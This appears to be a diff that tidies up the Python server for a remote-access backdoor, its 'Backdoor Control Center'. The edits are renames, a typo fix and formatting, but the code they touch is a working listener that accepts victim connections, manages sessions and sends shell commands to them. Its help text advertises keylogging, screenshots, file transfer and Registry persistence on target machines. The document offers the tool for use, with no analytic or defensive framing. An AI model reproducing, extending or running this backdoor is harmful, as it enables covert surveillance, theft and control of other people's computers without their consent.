@@ -11,8 +11,9 @@ import threading
 
 import termcolor
 
-def help():
-    help = """
+
+def show_help():
+    help_text = """
     >> # Backdoor
     quit                : Disconnect and quit active session
     background          : Quit active session without disconnecting
@@ -22,7 +23,7 @@ def help():
     download <filename> : Download file to target machine
     screenshot          : Take a screenshot of target machine
     keylog start        : Start keylogger
-    keylog dump         : Print keystokes that target inputted
+    keylog dump         : Print keystrokes that target inputted
     keylog stop         : Stop and self destruct keylogger file
     start <program>     : Start program on target machine
     persistence         : Create persistence in Registry
@@ -35,11 +36,13 @@ def help():
     sendall <command>   : Send the same command to all targets
     exit                : Close and exit program
     """
-    return help
+    return help_text
+
 
 def upload_file(target, filename):
     with open(filename, "rb") as file:
         target.send(file.read())
+
 
 def download_file(target, filename):
     with open(filename, "wb") as file:
@@ -51,6 +54,7 @@ def download_file(target, filename):
             except socket.timeout:
                 break
 
+
 def reliable_recv(target):
     data = ""
     while True:
@@ -60,16 +64,18 @@ def reliable_recv(target):
             print(e)
         return data
 
+
 def reliable_send(target, data):
     try:
         target.send(data.encode())
     except Exception as e:
         print(e)
 
+
 def target_connection(target, ip):
     count = 0
     while True:
-        command = input(f"Shell@({termcolor.colored(ip[0],'cyan')}):~$ ")
+        command = input(f"Shell@({termcolor.colored(ip[0], 'cyan')}):~$ ")
         reliable_send(target, command)
 
         if command == "quit":
@@ -78,7 +84,7 @@ def target_connection(target, ip):
             break
 
         elif command == "help":
-            print(help())
+            print(show_help())
 
         elif command == "clear":
             os.system("clear")
@@ -105,7 +111,6 @@ def target_connection(target, ip):
             response = reliable_recv(target)
             print(response)
 
-    #sock.close()
 
 def accept_connections():
     while True:
@@ -116,12 +121,12 @@ def accept_connections():
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
-            print(f"\n[+] Target connected from {ip} \n>>> ")
+            print(f"[+] Target connected from {ip}")
         except:
             pass
 
 
-host = "0.0.0.0" # To accept connection from all interfaces
+host = "0.0.0.0"  # To accept connection from all interfaces
 port = 65319
 
 targets = []
@@ -143,23 +148,23 @@ try:
         command = input("\n-# Backdoor Control Center #- \n>>> ")
 
         if command == "targets":
-            for id, ip in enumerate(ips):
-                print(f"Session {id} -> {ip}")
+            for session_id, ip in enumerate(ips):
+                print(f"Session {session_id} -> {ip}")
 
         elif command == "clear":
             os.system("clear")
 
         elif command == "help":
-            print(help())
+            print(show_help())
 
         elif command[:7] == "session":
+            session_id = int(command[8:])
             try:
-                id = int(command[8:])
-                target_id = targets[id]
-                target_ip = ips[id]
-                target_connection(target_id, target_ip)
+                target_addr = targets[session_id]
+                target_ip = ips[session_id]
+                target_connection(target_addr, target_ip)
             except:
-                print(f"[!!] No session under ID {id}")
+                print(f"[!!] No session under ID {session_id}")
 
         elif command == "exit":
             for target in targets:
